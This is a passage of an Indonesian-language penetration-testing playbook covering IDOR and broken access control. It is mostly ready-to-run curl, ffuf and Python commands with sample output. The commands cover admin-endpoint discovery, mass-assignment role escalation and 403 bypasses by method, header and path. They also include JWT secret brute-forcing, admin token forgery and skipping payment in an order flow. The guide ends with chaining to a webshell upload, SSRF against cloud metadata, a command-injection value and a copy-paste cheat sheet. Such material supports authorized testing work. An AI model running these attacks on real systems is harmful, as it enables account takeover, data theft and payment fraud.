> **Tujuan:** User biasa mencoba mengakses fungsi/object yang hanya boleh diakses admin. Ini lebih berbahaya dari horizontal IDOR karena bisa grant full admin access.

### Langkah 4.1 — Discover Admin Endpoints

Bash

```
# Command 1: Fuzzing admin endpoints
ffuf -u $TARGET/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc 200,201,301,302,400,401,403,405 \
  -H "Cookie: $(cat ~/idor_loot/sessions/userA.cookies | grep -v '#' | awk '{print $6"="$7}' | head -1)" \
  -t 30

# Command 2: Extract dari JS bundle
grep -Eo '"/api/[^"]*admin[^"]*"|"/admin/[^"]*"' ~/idor_loot/app.js | sort -u

# Command 3: Test endpoints yang sering ada
for endpoint in /admin /admin/users /admin/dashboard /api/admin /api/admin/users \
  /api/v1/admin /manage /management /api/manage /internal /api/internal; do
  STATUS=$(curl -so /dev/null -w "%{http_code}" \
    -b ~/idor_loot/sessions/userA.cookies "$TARGET$endpoint")
  echo "$endpoint → $STATUS"
done
```

**OUTPUT BERHASIL ✅ — Admin endpoint ditemukan dengan 403:**

text

```
/admin           → 403
/admin/users     → 403
/api/admin/users → 403
/manage          → 404
/api/admin       → 200   ← Accessible!
```

> **PENTING:** 403 ≠ "tidak ada". 403 berarti "ada tapi dilarang". Ini target untuk bypass!

---

### Langkah 4.2 — Test Vertical Access dengan User Token

Bash

```
# Test akses admin endpoint dengan session User A (non-admin)
curl -si \
  -b ~/idor_loot/sessions/userA.cookies \
  $TARGET/admin/users \
  | tee ~/idor_loot/responses/admin_users_userA.txt

# Cek berbagai admin functions
curl -si -b ~/idor_loot/sessions/userA.cookies $TARGET/api/admin/users
curl -si -b ~/idor_loot/sessions/userA.cookies $TARGET/api/admin/logs
curl -si -b ~/idor_loot/sessions/userA.cookies $TARGET/api/admin/settings
curl -si -b ~/idor_loot/sessions/userA.cookies "$TARGET/api/users/1"  # admin user ID
```

**OUTPUT BERHASIL ✅ — Missing Function Level Access Control:**

text

```
HTTP/1.1 200 OK
[
  {"id": 1, "username": "admin", "role": "superadmin", "email": "admin@corp.com"},
  {"id": 100, "username": "pentest_userA", "role": "user"},
  {"id": 101, "username": "pentest_userB", "role": "user"}
]
```

➡️ **CRITICAL FINDING!** User biasa bisa akses daftar semua user termasuk admin!

**OUTPUT GAGAL ❌ — 403 dengan pesan:**

text

```
HTTP/1.1 403 Forbidden
{"error": "Admin role required", "required_role": "admin"}
```

➡️ Authorization bekerja. Coba bypass di **Fase 6**.

---

### Langkah 4.3 — Mass Assignment (Privilege Escalation via Body Injection)

Bash

```
# Command 1: Normal profile update
curl -si \
  -b ~/idor_loot/sessions/userA.cookies \
  -X PUT \
  -H 'Content-Type: application/json' \
  -d '{"username":"pentest_userA_updated"}' \
  $TARGET/api/profile \
  | tee ~/idor_loot/responses/normal_update.txt

# Command 2: Mass assignment attempt — inject sensitive fields
curl -si \
  -b ~/idor_loot/sessions/userA.cookies \
  -X PUT \
  -H 'Content-Type: application/json' \
  -d '{
    "username": "pentest_userA",
    "role": "admin",
    "is_admin": true,
    "admin": true,
    "user_type": "administrator",
    "permissions": ["admin", "superuser"]
  }' \
  $TARGET/api/profile \
  | tee ~/idor_loot/responses/mass_assign_attempt.txt

# Command 3: Cek apakah role berubah
curl -si -b ~/idor_loot/sessions/userA.cookies $TARGET/api/profile
curl -si -b ~/idor_loot/sessions/userA.cookies $TARGET/api/users/$USER_A_ID
```

**OUTPUT BERHASIL ✅ — Mass assignment berhasil:**

JSON

```
{
  "id": 100,
  "username": "pentest_userA",
  "role": "admin",      ← BERUBAH!
  "is_admin": true      ← BERUBAH!
}
```

➡️ **Privilege escalation via mass assignment!** Refresh session dan coba akses admin endpoints:

Bash

```
# Re-login untuk refresh session dengan role baru
curl -si -X POST -H 'Content-Type: application/json' \
  -d "{\"username\":\"$USER_A\",\"password\":\"$PASS_A\"}" \
  $TARGET/login \
  -c ~/idor_loot/sessions/userA_admin.cookies

# Test admin endpoint dengan session baru
curl -si -b ~/idor_loot/sessions/userA_admin.cookies $TARGET/admin/users
```

**OUTPUT GAGAL ❌ — Field diabaikan:**

JSON

```
{
  "id": 100,
  "username": "pentest_userA",
  "role": "user",      ← Tidak berubah
  "updated": true
}
```

➡️ Server menggunakan allowlist. Mass assignment diblokir. Coba pendekatan lain.

---

## ═══════════════════════════════════════

## FASE 5: IDOR PADA API & GRAPHQL

## ═══════════════════════════════════════

### Langkah 5.1 — REST API IDOR Comprehensive Test

Bash

```
# Pattern 1: Path-based ID
for id in $(seq $((USER_B_ID - 5)) $((USER_B_ID + 5))); do
  STATUS=$(curl -so /dev/null -w "%{http_code}" \
    -b ~/idor_loot/sessions/userA.cookies "$TARGET/api/users/$id")
  echo "GET /api/users/$id → $STATUS"
done

# Pattern 2: Query parameter
curl -si -b ~/idor_loot/sessions/userA.cookies \
  "$TARGET/api/profile?user_id=$USER_B_ID"

# Pattern 3: Body parameter
curl -si -b ~/idor_loot/sessions/userA.cookies \
  -X POST -H 'Content-Type: application/json' \
  -d "{\"user_id\": $USER_B_ID}" \
  $TARGET/api/get_profile

# Pattern 4: Header-based
curl -si -b ~/idor_loot/sessions/userA.cookies \
  -H "X-User-ID: $USER_B_ID" \
  $TARGET/api/profile
```

**OUTPUT BERHASIL ✅ — Header-based IDOR:**

text

```
HTTP/1.1 200 OK
{"id": 101, "username": "pentest_userB", "email": "userB@test.com"}
```

➡️ Server mempercayai `X-User-ID` header dari client! Ini vulnerability serius.

---

### Langkah 5.2 — GraphQL IDOR

Bash

```
# Command 1: Cek apakah GraphQL tersedia
curl -si -b ~/idor_loot/sessions/userA.cookies \
  -X POST -H 'Content-Type: application/json' \
  -d '{"query":"{ __typename }"}' \
  $TARGET/graphql

# Command 2: Introspection untuk temukan schema
curl -s -b ~/idor_loot/sessions/userA.cookies \
  -X POST -H 'Content-Type: application/json' \
  -d '{
    "query": "{ __schema { queryType { fields { name args { name type { name kind } } } } mutationType { fields { name args { name } } } } }"
  }' \
  $TARGET/graphql | python3 -m json.tool | tee ~/idor_loot/responses/graphql_schema.txt

# Command 3: Baseline — akses data milik User A
curl -si -b ~/idor_loot/sessions/userA.cookies \
  -X POST -H 'Content-Type: application/json' \
  -d "{\"query\": \"query { user(id: $USER_A_ID) { id username email orders { id total } } }\"}" \
  $TARGET/graphql | tee ~/idor_loot/responses/graphql_own.txt

# Command 4: IDOR — akses data milik User B
curl -si -b ~/idor_loot/sessions/userA.cookies \
  -X POST -H 'Content-Type: application/json' \
  -d "{\"query\": \"query { user(id: $USER_B_ID) { id username email orders { id total } } }\"}" \
  $TARGET/graphql | tee ~/idor_loot/responses/graphql_other.txt

# Command 5: Via variables (lebih stealth)
curl -si -b ~/idor_loot/sessions/userA.cookies \
  -X POST -H 'Content-Type: application/json' \
  -d "{
    \"query\": \"query GetUser(\$id: Int!) { user(id: \$id) { id username email } }\",
    \"variables\": {\"id\": $USER_B_ID}
  }" \
  $TARGET/graphql
```

**OUTPUT BERHASIL ✅ — GraphQL IDOR:**

JSON

```
{
  "data": {
    "user": {
      "id": 101,
      "username": "pentest_userB",
      "email": "userB@test.com",
      "orders": [{"id": 1044, "total": 900000}]
    }
  }
}
```

**OUTPUT GAGAL ❌ — Introspection disabled:**

JSON

```
{"errors": [{"message": "Introspection is disabled"}]}
```

➡️ Coba query fields yang sudah diketahui dari HTTP history / Network tab browser:

Bash

```
# Gunakan field yang pernah terlihat di response
curl -s -b ~/idor_loot/sessions/userA.cookies \
  -X POST -H 'Content-Type: application/json' \
  -d "{\"query\": \"{ user(id: $USER_B_ID) { id email } }\"}" \
  $TARGET/graphql
```

---

## ═══════════════════════════════════════

## FASE 6: BYPASS TEKNIK

## ═══════════════════════════════════════

> Gunakan fase ini ketika sudah menemukan endpoint yang valid tapi mendapat 403. Bypass harus berdasarkan evidence, bukan trial-and-error acak.

### Langkah 6.1 — HTTP Method Bypass

Bash

```
# Jika GET /admin/users → 403, coba method lain
TARGET_ENDPOINT="$TARGET/admin/users"

for METHOD in GET POST PUT PATCH DELETE HEAD OPTIONS; do
  STATUS=$(curl -so /dev/null -w "%{http_code}" \
    -b ~/idor_loot/sessions/userA.cookies \
    -X "$METHOD" "$TARGET_ENDPOINT")
  echo "$METHOD $TARGET_ENDPOINT → $STATUS"
done
```

**OUTPUT BERHASIL ✅ — Method bypass:**

text

```
GET    /admin/users → 403
POST   /admin/users → 403
PUT    /admin/users → 200  ← BYPASS!
PATCH  /admin/users → 200  ← BYPASS!
```

---

### Langkah 6.2 — Header-Based Bypass

Bash

```
TARGET_ENDPOINT="$TARGET/admin/users"

# Test berbagai headers bypass
declare -A BYPASS_HEADERS=(
  ["X-Forwarded-For"]="127.0.0.1"
  ["X-Original-URL"]="/admin/users"
  ["X-Rewrite-URL"]="/admin/users"
  ["X-Custom-IP-Authorization"]="127.0.0.1"
  ["X-Real-IP"]="127.0.0.1"
  ["Forwarded"]="for=127.0.0.1"
  ["X-Remote-IP"]="127.0.0.1"
  ["X-Remote-Addr"]="127.0.0.1"
  ["X-Originating-IP"]="127.0.0.1"
)

for HEADER in "${!BYPASS_HEADERS[@]}"; do
  STATUS=$(curl -so /dev/null -w "%{http_code}" \
    -b ~/idor_loot/sessions/userA.cookies \
    -H "$HEADER: ${BYPASS_HEADERS[$HEADER]}" \
    "$TARGET_ENDPOINT")
  echo "$HEADER: ${BYPASS_HEADERS[$HEADER]} → $STATUS"
done
```

**OUTPUT BERHASIL ✅ — IP header bypass:**

text

```
X-Forwarded-For: 127.0.0.1 → 200  ← BYPASS!
```

---

### Langkah 6.3 — Path Normalization Bypass

Bash

```
TARGET_ENDPOINT="admin/users"

# Test berbagai path variations
PATHS=(
  "/admin/users"
  "/admin//users"
  "/admin/./users"
  "/%61dmin/users"      # URL encode 'a'
  "/ADMIN/users"        # Case variation
  "//admin/users"
  "/admin/users/"       # Trailing slash
  "/api/../admin/users" # Path traversal
  "/admin%2fusers"      # Encoded slash
  "/.admin/users"       # Hidden path
)

for PATH in "${PATHS[@]}"; do
  STATUS=$(curl -so /dev/null -w "%{http_code}" \
    -b ~/idor_loot/sessions/userA.cookies \
    "$TARGET$PATH")
  echo "$PATH → $STATUS"
done
```

**OUTPUT BERHASIL ✅ — Path bypass:**

text

```
/admin/users       → 403
/ADMIN/users       → 200  ← BYPASS! (case-insensitive routing)
/admin/./users     → 200  ← BYPASS! (normalization issue)
```

---

### Langkah 6.4 — Referer Header Bypass

Bash

```
# Beberapa aplikasi cek Referer untuk "internal" request
curl -si \
  -b ~/idor_loot/sessions/userA.cookies \
  -H "Referer: $TARGET/admin/" \
  $TARGET/admin/users

# Atau cek apakah Content-Type manipulation berpengaruh
curl -si \
  -b ~/idor_loot/sessions/userA.cookies \
  -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data "user_id=$USER_B_ID" \
  $TARGET/api/get_profile
```

---

## ═══════════════════════════════════════

## FASE 7: JWT CLAIMS IDOR

## ═══════════════════════════════════════

### Langkah 7.1 — Decode dan Analisis JWT

Bash

```
# Decode JWT payload tanpa verify signature
python3 << 'EOF'
import base64, json, sys

def decode_jwt(token):
    parts = token.split('.')
    if len(parts) != 3:
        print("[!] Bukan JWT valid")
        return
    
    # Decode header
    header = parts[0]
    header += "=" * (-len(header) % 4)
    header_data = json.loads(base64.urlsafe_b64decode(header))
    print(f"[*] Header: {json.dumps(header_data, indent=2)}")
    
    # Decode payload
    payload = parts[1]
    payload += "=" * (-len(payload) % 4)
    payload_data = json.loads(base64.urlsafe_b64decode(payload))
    print(f"[*] Payload: {json.dumps(payload_data, indent=2)}")
    
    # Analyze claims
    interesting = ['sub', 'user_id', 'uid', 'id', 'role', 'is_admin', 
                   'account_id', 'organization_id', 'permissions']
    print("\n[*] Interesting Claims:")
    for key in interesting:
        if key in payload_data:
            print(f"    {key}: {payload_data[key]}")
    
    # Check algorithm
    alg = header_data.get('alg', 'unknown')
    print(f"\n[*] Algorithm: {alg}")
    if alg == 'none':
        print("    [!] CRITICAL: alg=none vulnerability!")
    elif alg == 'HS256':
        print("    [*] HMAC-SHA256. Try brute force if key is weak.")
    
    return header_data, payload_data

# Ganti dengan token dari login
TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMDAiLCJ1c2VybmFtZSI6InBlbnRlc3RfdXNlckEiLCJyb2xlIjoidXNlciIsImlhdCI6MTcwMDAwMDAwMH0.SIGNATURE"
decode_jwt(TOKEN)
EOF
```

**Output:**

text

```
[*] Header: {
  "alg": "HS256",
  "typ": "JWT"
}
[*] Payload: {
  "sub": "100",
  "username": "pentest_userA",
  "role": "user",
  "iat": 1700000000
}
[*] Interesting Claims:
    sub: 100
    role: user

[*] Algorithm: HS256
    [*] HMAC-SHA256. Try brute force if key is weak.
```

---

### Langkah 7.2 — JWT IDOR Test (Ganti sub/user_id)

Bash

```
# Cek apakah server menggunakan JWT claim 'sub' untuk lookup
# Jika bisa manipulasi JWT (weak key atau alg:none), ganti sub ke user B ID

# Test 1: Apakah server trust header X-User-ID (sering di microservices)
curl -si \
  -H "Authorization: Bearer $TOKEN_A" \
  -H "X-User-ID: $USER_B_ID" \
  $TARGET/api/profile

# Test 2: cek jwt-tool jika tersedia
which jwt_tool 2>/dev/null && echo "jwt_tool tersedia" || echo "jwt_tool tidak ada"

# Install jika belum ada
pip3 install jwt -q 2>/dev/null

# Test 3: Coba crack JWT secret (brute force)
python3 << 'EOF'
import hmac, hashlib, base64, json

def try_crack_jwt(token, wordlist_path="/usr/share/wordlists/rockyou.txt"):
    parts = token.split('.')
    header_payload = f"{parts[0]}.{parts[1]}"
    
    # Decode signature
    sig = parts[2]
    sig += "=" * (-len(sig) % 4)
    expected_sig = base64.urlsafe_b64decode(sig)
    
    try:
        with open(wordlist_path, 'r', errors='ignore') as f:
            for i, line in enumerate(f):
                secret = line.strip().encode()
                computed = hmac.new(secret, header_payload.encode(), 
                                   hashlib.sha256).digest()
                if computed == expected_sig:
                    print(f"[+] SECRET FOUND: '{line.strip()}'")
                    return line.strip()
                if i % 10000 == 0:
                    print(f"[*] Tried {i} passwords...")
    except FileNotFoundError:
        print("[!] Wordlist not found, try common secrets manually")
        # Try common secrets
        common = ['secret', 'password', 'jwt_secret', 'mysecret', '123456',
                  'your-256-bit-secret', 'supersecret', 'changeme']
        for s in common:
            computed = hmac.new(s.encode(), header_payload.encode(),
                               hashlib.sha256).digest()
            if computed == expected_sig:
                print(f"[+] SECRET FOUND: '{s}'")
                return s
    
    print("[-] Secret not found in wordlist")
    return None

# Ganti dengan token aktual
TOKEN = "YOUR_JWT_TOKEN_HERE"
if "." in TOKEN and TOKEN.count(".") == 2:
    try_crack_jwt(TOKEN)
EOF
```

**OUTPUT BERHASIL ✅ — JWT secret ditemukan:**

text

```
[+] SECRET FOUND: 'secret'
```

➡️ Forge token baru dengan user_id berbeda:

Bash

```
python3 << 'EOF'
import jwt, json, time

SECRET = "secret"
ALGORITHM = "HS256"

# Forge token sebagai User B
payload_as_B = {
    "sub": "101",
    "username": "pentest_userB",
    "role": "user",
    "iat": int(time.time())
}

forged_token_B = jwt.encode(payload_as_B, SECRET, algorithm=ALGORITHM)
print(f"[+] Forged Token (as User B): {forged_token_B}")

# Forge token sebagai Admin
payload_as_admin = {
    "sub": "1",
    "username": "admin",
    "role": "admin",
    "is_admin": True,
    "iat": int(time.time())
}

forged_token_admin = jwt.encode(payload_as_admin, SECRET, algorithm=ALGORITHM)
print(f"[+] Forged Token (as Admin): {forged_token_admin}")
EOF

# Test forged token
curl -si \
  -H "Authorization: Bearer FORGED_TOKEN_HERE" \
  $TARGET/api/profile

curl -si \
  -H "Authorization: Bearer FORGED_ADMIN_TOKEN_HERE" \
  $TARGET/admin/users
```

---

## ═══════════════════════════════════════

## FASE 8: PARAMETER POLLUTION & ADVANCED

## ═══════════════════════════════════════

### Langkah 8.1 — Parameter Pollution

Bash

```
# Test 1: Duplicate query params
curl -si -b ~/idor_loot/sessions/userA.cookies \
  "$TARGET/api/profile?user_id=$USER_A_ID&user_id=$USER_B_ID"

# Test 2: Array notation
curl -si -b ~/idor_loot/sessions/userA.cookies \
  "$TARGET/api/profile?user_id[]=$USER_A_ID&user_id[]=$USER_B_ID"

# Test 3: Form body pollution
curl -si -b ~/idor_loot/sessions/userA.cookies \
  -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data "user_id=$USER_A_ID&user_id=$USER_B_ID" \
  $TARGET/api/get_profile

# Test 4: JSON duplicate keys (parser-dependent!)
curl -si -b ~/idor_loot/sessions/userA.cookies \
  -X POST \
  -H 'Content-Type: application/json' \
  --data "{\"user_id\":$USER_A_ID,\"user_id\":$USER_B_ID}" \
  $TARGET/api/profile
```

**OUTPUT BERHASIL ✅ — Last value wins:**

text

```
HTTP/1.1 200 OK
{"id": 101, "username": "pentest_userB"}  ← User B's data returned!
```

---

### Langkah 8.2 — API Versioning IDOR

Bash

```
# Test endpoint yang sama di berbagai versi API
BASE_ENDPOINT="/users/$USER_B_ID"

for version in "" "/v1" "/v2" "/v3" "/api" "/api/v1" "/api/v2" \
  "/api/mobile" "/api/legacy" "/api/beta" "/api/internal"; do
  STATUS=$(curl -so /dev/null -w "%{http_code}" \
    -b ~/idor_loot/sessions/userA.cookies \
    "$TARGET$version$BASE_ENDPOINT")
  echo "$version$BASE_ENDPOINT → $STATUS"
done
```

**OUTPUT BERHASIL ✅ — Old API version tidak aman:**

text

```
/api/v2/users/101 → 403  (aman)
/api/v1/users/101 → 200  ← Old version tidak punya auth check!
/api/mobile/users/101 → 200  ← Mobile endpoint tidak aman!
```

---

### Langkah 8.3 — State Machine Bypass

Bash

```
# Skenario: Order process harusnya: create → payment → confirm
# Test apakah bisa skip payment

# Step 1: Buat order baru
NEW_ORDER=$(curl -s -b ~/idor_loot/sessions/userA.cookies \
  -X POST -H 'Content-Type: application/json' \
  -d '{"item_id": 1, "quantity": 1}' \
  $TARGET/api/orders)
NEW_ORDER_ID=$(echo $NEW_ORDER | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])" 2>/dev/null)
echo "New order ID: $NEW_ORDER_ID"

# Step 2: Skip payment, langsung confirm
curl -si -b ~/idor_loot/sessions/userA.cookies \
  -X POST -H 'Content-Type: application/json' \
  -d "{\"order_id\": $NEW_ORDER_ID}" \
  $TARGET/api/order/confirm

# Step 3: Test state manipulation
curl -si -b ~/idor_loot/sessions/userA.cookies \
  -X PATCH -H 'Content-Type: application/json' \
  -d "{\"order_id\": $NEW_ORDER_ID, \"state\": \"completed\"}" \
  $TARGET/api/order/state
```

**OUTPUT BERHASIL ✅ — State bypass:**

text

```
HTTP/1.1 200 OK
{"order_id": 55, "state": "completed", "message": "Order confirmed!"}
# Padahal belum bayar!
```

---

## ═══════════════════════════════════════

## FASE 9: SECOND-ORDER IDOR & CHAINING

## ═══════════════════════════════════════

### Langkah 9.1 — Second-Order IDOR

Bash

```
# Second-order: submit reference ke object orang lain, 
# server store-nya, lalu akses nanti

# Step 1: Buat support ticket dengan attachment_id milik User B
curl -si -b ~/idor_loot/sessions/userA.cookies \
  -X POST -H 'Content-Type: application/json' \
  -d "{\"title\": \"Help me\", \"attachment_id\": \"$OTHER_FILE_ID\"}" \
  $TARGET/api/support/ticket

# Step 2: Lihat ticket — apakah attachment_id User B ikut di-serve?
TICKET_ID="<dari response step 1>"
curl -si -b ~/idor_loot/sessions/userA.cookies \
  $TARGET/api/support/ticket/$TICKET_ID
```

**OUTPUT BERHASIL ✅ — Second-order IDOR:**

JSON

```
{
  "ticket_id": 50,
  "title": "Help me",
  "attachment": {
    "id": "ghi789",
    "name": "contract.pdf",    ← File milik User B ter-embed!
    "content": "base64encodedcontent..."
  }
}
```

---

### Langkah 9.2 — IDOR Chain ke Vulnerabilities Lain

Bash

```
# Chain 1: IDOR → File Upload → Webshell
# Jika IDOR bisa akses endpoint upload milik admin/user lain
curl -si -b ~/idor_loot/sessions/userA.cookies \
  -X POST \
  -F "user_id=$USER_B_ID" \
  -F "file=@/tmp/shell.php;type=image/jpeg" \
  $TARGET/api/upload

# Chain 2: IDOR → SSRF
# Jika user bisa set webhook/integration URL
curl -si -b ~/idor_loot/sessions/userA.cookies \
  -X PUT -H 'Content-Type: application/json' \
  -d "{\"user_id\": $USER_B_ID, \"webhook_url\": \"http://169.254.169.254/latest/meta-data/\"}" \
  $TARGET/api/integrations/$USER_B_ID

# Chain 3: IDOR → Command Injection
# Jika bisa akses network diagnostic endpoint milik user lain
curl -si -b ~/idor_loot/sessions/userA.cookies \
  -X POST -H 'Content-Type: application/json' \
  -d "{\"job_id\": \"OTHER_USER_JOB_ID\", \"host\": \"127.0.0.1; id\"}" \
  $TARGET/api/diagnostics/run
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error/Situasi|Penyebab|Solusi|
|---|---|---|
|Semua variasi 403|Authorization enforced|Cari object lain / endpoint lain / method bypass|
|404 padahal ID valid|App pakai 404 untuk hide unauthorized|Verifikasi dengan User B session dulu|
|Response sama persis|Objects mungkin sama owner|Pastikan object ID benar-benar berbeda owner|
|Rate limiting 429|Terlalu banyak request|Gunakan `DELAY=2` di idor_test.sh|
|UUID tidak bisa ditebak|UUID truly random|Cari UUID leak di API response/email/notification lain|
|Base64 ID error|Padding salah|`python3 -c "import base64; print(base64.b64encode(b'124').decode())"`|
|JWT signature invalid|Secret tidak diketahui|Coba brute force atau alg:none bypass|
|CSRF token required|Anti-CSRF aktif|Capture token dari response sebelumnya|
|Cookie expired|Session timeout|Login ulang dan capture cookie baru|
|`user_id[]=` → 400|Backend expect scalar|Jangan paksa array, coba duplicate param biasa|
|GraphQL introspection off|Disabled by admin|Gunakan fields dari HTTP history|
|Mass assignment ignored|Allowlist/DTO used|Cari field lain yang mungkin tidak di-whitelist|
|API versioning semua 403|Konsisten|Cari mobile/internal/beta endpoint|
|State bypass gagal|Server validate transition|Map full state machine dulu|
|Method bypass tidak berhasil|Authorization per-method benar|Coba path/header bypass|

**Kapan Search Google:**

text

```
# Jika ketemu response error yang tidak familiar:
"<FRAMEWORK_NAME> IDOR bypass site:hacktricks.xyz"
"<FRAMEWORK_NAME> mass assignment protection bypass"
"jwt alg none bypass <LIBRARY>"
"graphql authorization bypass <IMPLEMENTATION>"

# Jika aplikasi pakai framework spesifik:
"Rails mass assignment CVE"
"Spring security IDOR"
"Django permission check bypass"
```

---

## ═══════════════════════════════════════

## MASTER DECISION TREE (RINGKASAN)

## ═══════════════════════════════════════

text

```
START: Web Application Target
│
├─ FASE 0: Recon
│   ├─ Teknologi stack
│   ├─ Auth type (session/JWT/basic)
│   └─ Endpoint discovery (ffuf + JS analysis)
│
├─ FASE 1: Setup 2 Akun (WAJIB untuk horizontal test)
│   ├─ Register User A & B
│   └─ Login, simpan session/token
│
├─ FASE 2: Identifikasi Object References
│   ├─ Catat semua ID (numeric, UUID, base64, dll)
│   └─ Map siapa owner dari setiap object
│
├─ FASE 3: Horizontal IDOR
│   ├─ [ID sequential] → idor_test.sh automation
│   ├─ [GET 200 dengan data orang lain] → IDOR CONFIRMED!
│   ├─ [GET 403 tapi PUT/PATCH 200] → Method-specific IDOR
│   └─ [File download] → Test filename/file_id manipulation
│
├─ FASE 4: Vertical Escalation
│   ├─ [Admin endpoint accessible] → Missing Function Auth
│   ├─ [Mass assignment berhasil] → Role escalation
│   └─ [JWT claims bisa diubah] → → Fase 7
│
├─ FASE 5: API & GraphQL
│   ├─ [GraphQL IDOR] → Modify query ID
│   └─ [REST semua methods] → GET/POST/PUT/PATCH/DELETE
│
├─ FASE 6: Bypass (jika dapat 403 pada endpoint valid)
│   ├─ Method bypass
│   ├─ Header bypass (X-Forwarded-For, dll)
│   └─ Path normalization bypass
│
└─ FASE 9: Chaining
    ├─ IDOR + File Upload → RCE
    ├─ IDOR + SSRF → Internal network
    ├─ IDOR + Command Injection → RCE
    └─ IDOR + SQL Injection → Data dump
```

---

## Cross-Service / Cross-Workflow Reference

text

```
IDOR/BAC Findings
     │
     ├─ ─→ JWT manipulation  → <a href="/docs/jwt" class="text-[#00b4d8] hover:underline font-mono font-semibold">28_jwt_workflow.md</a>
     ├──→ File upload abuse → <a href="/docs/file-upload" class="text-[#00b4d8] hover:underline font-mono font-semibold">25_file_upload_workflow.md</a>
     ├──→ SSRF via webhook  → <a href="/docs/ssrf" class="text-[#00b4d8] hover:underline font-mono font-semibold">22_ssrf_workflow.md</a>
     ├──→ LFI via file ref  → <a href="/docs/lfi-rfi" class="text-[#00b4d8] hover:underline font-mono font-semibold">24_lfi_rfi_workflow.md</a>
     ├──→ SQLi on endpoint  → <a href="/docs/sql-injection" class="text-[#00b4d8] hover:underline font-mono font-semibold">19_sql_injection_workflow.md</a>
     ├──→ SSTI via template → <a href="/docs/ssti" class="text-[#00b4d8] hover:underline font-mono font-semibold">23_ssti_workflow.md</a>
     ├──→ Cmd injection     → <a href="/docs/command-injection" class="text-[#00b4d8] hover:underline font-mono font-semibold">26_command_injection_workflow.md</a>
     └──→ API security      → <a href="/docs/api-security" class="text-[#00b4d8] hover:underline font-mono font-semibold">30_api_security_workflow.md</a>
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === SETUP ===
export TARGET="http://10.10.11.200"
export USER_A_ID="100"; export USER_B_ID="101"
export OWN_ORDER="1042"; export OTHER_ORDER="1044"
mkdir -p ~/idor_loot/{responses,sessions,scripts,evidence}

# === RECON ===
ffuf -u $TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,401,403
grep -Eo '(/api/|/admin/)[A-Za-z0-9_./-]+' ~/idor_loot/app.js | sort -u

# === HORIZONTAL IDOR ===
# Baseline
curl -si -b userA.cookies $TARGET/api/orders/$OWN_ORDER
# IDOR attempt
curl -si -b userA.cookies $TARGET/api/orders/$OTHER_ORDER

# === VERTICAL IDOR ===
curl -si -b userA.cookies $TARGET/admin/users
curl -si -b userA.cookies -X PUT -H 'Content-Type: application/json' \
  -d '{"role":"admin","is_admin":true}' $TARGET/api/profile

# === AUTOMATED SCAN ===
DELAY=1 ~/idor_loot/scripts/idor_test.sh "$TARGET/api/orders" "order_id" 1040 1050 userA.cookies
PATH_MODE=true ~/idor_loot/scripts/idor_test.sh "$TARGET/api/users" "" 95 110 userA.cookies

# === BYPASS ===
# Method bypass
for m in GET POST PUT PATCH DELETE; do
  echo "$m: $(curl -so /dev/null -w "%{http_code}" -X $m -b userA.cookies $TARGET/admin/users)"
done
# Header bypass
curl -si -b userA.cookies -H 'X-Forwarded-For: 127.0.0.1' $TARGET/admin/users
curl -si -b userA.cookies -H 'X-Original-URL: /admin/users' $TARGET/

# === GRAPHQL ===
curl -s -b userA.cookies -X POST -H 'Content-Type: application/json' \
  -d '{"query":"{ __schema { queryType { fields { name } } } }"}' \
  $TARGET/graphql
curl -s -b userA.cookies -X POST -H 'Content-Type: application/json' \
  -d "{\"query\":\"{ user(id: $USER_B_ID) { id email orders { id } } }\"}" \
  $TARGET/graphql

# === PARAMETER POLLUTION ===
curl -si -b userA.cookies "$TARGET/api/profile?user_id=$USER_A_ID&user_id=$USER_B_ID"
curl -si -b userA.cookies -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data "user_id=$USER_A_ID&user_id=$USER_B_ID" \
  $TARGET/api/profile
```

---

> **➡️ NEXT:** Setelah IDOR selesai, jika ditemukan JWT yang menarik lanjut ke **[🔐 28 — JWT Workflow](/docs/jwt)**. Jika ada file upload yang bisa diakses via IDOR → **`<a href="/docs/file-upload" class="text-[#00b4d8] hover:underline font-mono font-semibold">25_file_upload_workflow.md</a>`**.